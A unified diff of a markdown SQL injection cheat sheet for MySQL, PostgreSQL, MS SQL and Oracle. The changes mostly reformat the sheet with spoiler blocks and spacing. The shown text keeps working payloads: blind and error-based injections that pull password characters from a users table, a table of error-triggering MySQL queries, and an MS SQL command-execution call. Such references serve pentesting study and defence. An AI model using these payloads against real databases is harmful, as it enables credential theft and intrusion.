@@ -15,6 +15,7 @@ I collect different types of sqli attacks from the internet.
 
 In this document I am targeting 4 databases: MySQL, PostgreSQL, MS SQL, ORACLE
 
+
 ## Content
 
 * TOC
@@ -29,8 +30,9 @@ In this document I am targeting 4 databases: MySQL, PostgreSQL, MS SQL, ORACLE
 - ***blind sqli*** - you can see some differences between successfull query and unsuccessfull:
 
     - any visible in the page source code differences *(different numbers of `br` in document, different news posts depending on querry, etc)*
-    - you can destinguish that error happens, but do not see its text
-    - you may have an opportunity to destinguish types of dtabase errors, but not its content, so you can not return data in error
+    - you may have an opportunity to destinguish types of database errors, but not its content, so you can not return data in error
+
+        this is a mutated vector called ***error based blind sqli***
 
 - ***double blind sqli (time-based)*** - there is absolutely on other means to destinguish successfull and unsuccessfull query, but you can use `sleep` or `benchmark` or some hard mathematical computation to make successfull query work significantly longer.
 
@@ -51,6 +53,8 @@ This mitigation does work if implemented correctly but it is **NOT** correct mit
 1. Any differences in databases syntax or semantics help defining database type.
 
 -->
+
+<br><br>
 
 ---
 
@@ -297,6 +301,8 @@ Handy functions
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
 
+<br><br>
+
 ---
 
 ## SQL injection technics
@@ -415,6 +421,7 @@ select concat( concat(
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
+<br><br>
 
 ---
 
@@ -586,6 +593,7 @@ from dual);</pre>
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
+<br><br>
 
 ---
 
@@ -605,8 +613,11 @@ from dual);</pre>
 
     news.php?id=`FIND_IN_SET (substring ((select password from users limit 0,1), 1, 1), '0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f')`
 
+<div class="spoiler"><div class="spoiler-title">
+    <i>Error-based blind sql-injection. (11 + 1 error types)</i>
+</div><div class="spoiler-text" markdown="1">
 
-> Error-based blind sql-injection. This query returns 11 different types of errors or no error depending on the first letter from pass.
+>  <br>This query returns 11 different types of errors or no error depending on the first letter from pass.
 > 
     sql.php?id=1 AND "x" 
     regexp concat("x{1,25", (if(find_in_set(substring((select pass from users limit 0,1),1,1),'0,c,d,e,f,1,2,3,4,5,6,7,8,9,a'),
@@ -632,8 +643,11 @@ from dual);</pre>
     '}[2-1]')),
     '}[[.ch.]]')),
     '}\\'))) -- 1
-> 
-> > 11 + 1 types of mysql errors
+> <div class="spoiler"><div class="spoiler-title">
+> 11 + 1 types of mysql errors
+> </div><div class="spoiler-text" markdown="1">
+>
+> > <br>
 > >
 | 0  | `select 1;`                                   | No error                                                            |
 | 1  | `select if(1=1,(select 1 union select 2),2);` | #1242 - Subquery returns more than 1 row                            |
@@ -647,11 +661,13 @@ from dual);</pre>
 | 9  | `select 1 regexp if(1=1,'[2-1]',2);`          | #1139 - Got error 'invalid character range' from regexp             |
 | 10 | `select 1 regexp if(1=1,'[[.ch.]]',2);`       | #1139 - Got error 'invalid collating element' from regexp           |
 | 11 | `select 1 regexp if(1=1,'\\',2);`             | #1139 - Got error 'trailing backslash (\)' from regexp              |
+> </div></div>
+</div></div>
 
-
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
+<br><br>
 
 ---
 
@@ -678,6 +694,7 @@ from dual);</pre>
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
+<br><br>
 
 ---
 
@@ -806,6 +823,7 @@ EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c';</pre>
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
+<br><br>
 
 ---
 
